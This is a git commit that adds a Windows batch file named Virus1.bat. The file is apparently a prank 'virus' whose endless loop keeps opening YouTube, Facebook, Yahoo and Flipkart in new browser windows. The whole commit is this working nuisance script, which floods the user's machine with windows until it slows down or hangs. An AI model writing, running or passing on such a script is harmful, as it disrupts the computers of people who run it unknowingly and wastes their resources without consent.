17938b034bc8d251878363ee0e196421a50f5810
CyberKing2020 <70086255+CyberKing2020@users.noreply.github.com>
2022-12-07 22:12:01 +0530

    Add files via upload

---
+++ Virus1.bat
@@ -0,0 +1,11 @@
+@echo off
+:a
+start www.youtube.com
+start www.facebook.com
+start www.yahoo.com
+start www.flipkart.com
+start www.youtube.com
+start www.facebook.com
+start www.yahoo.com
+start www.flipkart.com
+goto :a
